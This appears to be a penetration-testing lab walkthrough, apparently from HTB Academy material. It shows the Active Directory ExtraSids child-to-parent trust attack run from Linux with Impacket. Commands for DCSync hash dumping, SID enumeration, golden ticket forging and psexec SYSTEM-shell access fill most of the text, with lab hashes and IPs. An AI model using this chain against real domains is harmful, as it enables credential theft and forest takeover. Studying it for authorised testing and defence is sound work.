# Attacking Domain Trusts: Child to Parent from Linux

The same ExtraSids attack covered in the Windows section is fully executable from a Linux attack host using Impacket tools. The data requirements are identical; only the tooling changes. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

***

## Data Collection

### Step 1: DCSync the Child Domain KRBTGT Hash

```bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

This returns the NTLM hash in the `lmhash:nthash` format. Grab the value after the second colon:

```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
```

The NT hash is `9d765b482771505cbe97411065964d5f`. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

### Step 2: Get the Child Domain SID

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
# [*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
```

`lookupsid.py` performs SID brute forcing against the target DC. Without the `grep` filter it returns every user and group in the domain with their RIDs, which is useful for building a full picture but noisy when you just need the domain SID. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

### Step 3: Get the Parent Domain Enterprise Admins SID

Point `lookupsid.py` at the parent domain DC instead:

```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```

The `-B12` flag prints 12 lines before the match, which includes the parent domain SID at the top of the output. Enterprise Admins always carries RID `-519`, so the full SID is:

```
S-1-5-21-3842939050-3880317879-2865463114-519
```



***

## Collected Data Points

| Item | Value |
|------|-------|
| KRBTGT NT hash (child) | `9d765b482771505cbe97411065964d5f` |
| Child domain SID | `S-1-5-21-2806153819-209893948-922872689` |
| Target username | `hacker` (non-existent, any name works) |
| Child domain FQDN | `LOGISTICS.INLANEFREIGHT.LOCAL` |
| Enterprise Admins SID | `S-1-5-21-3842939050-3880317879-2865463114-519` |

***

## Building and Using the Golden Ticket

### Step 4: Forge the Golden Ticket with ticketer.py

```bash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f \
  -domain LOGISTICS.INLANEFREIGHT.LOCAL \
  -domain-sid S-1-5-21-2806153819-209893948-922872689 \
  -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 \
  hacker
```

`ticketer.py` saves the forged ticket as `hacker.ccache` on disk. The `-extra-sid` flag is what injects the Enterprise Admins SID into the ticket's `sidHistory`, making the Windows DC treat this account as a forest-level administrator. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

### Step 5: Set the Environment Variable

```bash
export KRB5CCNAME=hacker.ccache
```

All Kerberos-aware Impacket tools (and Linux Kerberos utilities) read from the file referenced by `KRB5CCNAME`. Once this is set, any tool that supports `-k` will use the forged ticket automatically without needing to supply credentials. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

### Step 6: Get a SYSTEM Shell on the Parent DC

```bash
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

Flag breakdown:

- `-k` tells psexec to use Kerberos authentication from the ccache file
- `-no-pass` skips the password prompt since the ticket handles auth
- `-target-ip` points to the parent DC's IP address directly

If successful, a SYSTEM shell drops on the parent DC:

```
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
ACADEMY-EA-DC01
```



***

## Automated Method: raiseChild.py

Impacket includes `raiseChild.py` which automates the entire chain with a single command:

```bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

The script performs each step automatically: [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

1. Locates the child and parent DC via MS-NRPC
2. Retrieves the forest FQDN
3. Gets the Enterprise Admins SID via MS-LSAT
4. DCsyncs the child KRBTGT hash via MS-DRSR
5. Constructs the Golden Ticket with the ExtraSids field populated
6. Authenticates to the parent domain and retrieves the Administrator credentials
7. Drops a psexec shell on the target if `-target-exec` is specified

The output confirms the full chain: both the child and parent domain KRBTGT hashes are retrieved, the parent Administrator's NT hash is returned, and a SYSTEM shell is delivered on the parent DC.

***

## Manual vs Automated: When to Use Which

`raiseChild.py` is fast but should not be your default approach in production environments. If it fails mid-execution, you will have limited visibility into what went wrong and why. The manual method using `secretsdump.py`, `lookupsid.py`, `ticketer.py`, and `psexec.py` separately gives you full control and a clear understanding of each step. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)

More importantly, automated "autopwn" scripts carry operational risk. An error in a script mid-execution against a production DC can cause unexpected behaviour that is difficult to explain to a client. Construct commands manually when possible, and only use automation tools where you fully understand what they are doing under the hood and can replicate the steps yourself if something goes wrong. [ppl-ai-file-upload.s3.amazonaws](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/162556870/834886e2-c519-4551-bc23-22cc70ae5824/paste.txt)
